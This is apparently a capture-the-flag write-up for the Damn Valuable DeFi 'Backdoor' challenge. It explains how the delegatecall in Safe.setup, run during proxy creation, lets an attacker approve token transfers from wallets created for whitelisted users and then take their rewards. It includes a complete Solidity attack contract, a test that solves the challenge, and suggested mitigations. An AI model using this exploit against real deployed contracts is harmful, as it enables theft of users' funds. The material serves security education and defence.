## An attacker can create a Safe wallet on behalf a whitelisted user and maliciously approve token transfers from it.

When `SafeProxyFactory.createProxyWithCallback` is called, it calls `createProxyWithNonce` which in turn calls `deployProxy` (all within the same contract).

`deployProxy` deploys a proxy that uses a singleton Safe contract for its logic. It then performs a low-level call to one of its functions using `initializer` param as data for the call. The `WalletRegistry` contract requires the function in the `initializer` data to be a call to the `Safe.setup` function.

In the setup function, we can pass `to` and `data` parameters, which will be used to execute a delegatecall. The attacker can pass the address of a malicious contract as the to parameter. This malicious contract can approve token transfers from the newly created Safe wallet. After the `WalletRegistry` sends the reward to the new Safe wallet, the maliciously approved address can then steal the funds.


### PoC
Attacker contract:
```solidity
contract Attacker {
    function approve(DamnValuableToken token, address receiver, uint256 amount) public {
        token.approve(receiver, amount);
    }
    
    function attack(
        address[] memory users,
        DamnValuableToken token,
        SafeProxyFactory walletFactory,
        Safe singletonCopy,
        WalletRegistry walletRegistry,
        address recovery
    ) public {
        // loop for each user
        for(uint8 i; i<users.length; i++) {
            // prepare setup params
            address[] memory _owners = new address[](1);
            _owners[0] = users[i];

            bytes memory initializer = abi.encodeWithSignature(
                'setup(address[],uint256,address,bytes,address,address,uint256,address)',
                _owners, 
                1, 
                // THE ATTACK IS HERE (next 2 lines)
                address(this), // call this contract
                abi.encodeWithSignature('approve(address,address,uint256)', token, address(this), 10e18), // ATTACK -> call to approve tokens on behalf the Safe
                address(0), 
                address(0),
                0,
                address(0) 
            );

            // create the wallet
            SafeProxy proxy = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                0,
                walletRegistry
            );
            // Aboves function finish when the callback to Registry is executed AKA the new wallet already has the reward
            // So we just have to call transferFrom to recover the funds
            token.transferFrom(address(proxy), recovery, 10e18);
        }
    }
}
```
Then just deploy it on the test suite:
```solidity
    function test_backdoor() public 
    checkSolvedByPlayer 
    {
        Attacker attacker = new Attacker();

        attacker.attack(
            users,
            token,
            walletFactory,
            singletonCopy,
            walletRegistry,
            recovery
        );
    }
```

### Recommended?possible mitigations
- On the `proxyCreated` callback, add a conditional check to ensure that `tx.origin` is the same as the intended owner of the Safe wallet. This prevents anyone other than the owner from creating their own wallet.
- If the above solution isn't suitable, decode the entire `initializer` parameter and verify that the `to` parameter is address zero. This would prevent the execution of any malicious or unintended logic during the creation process.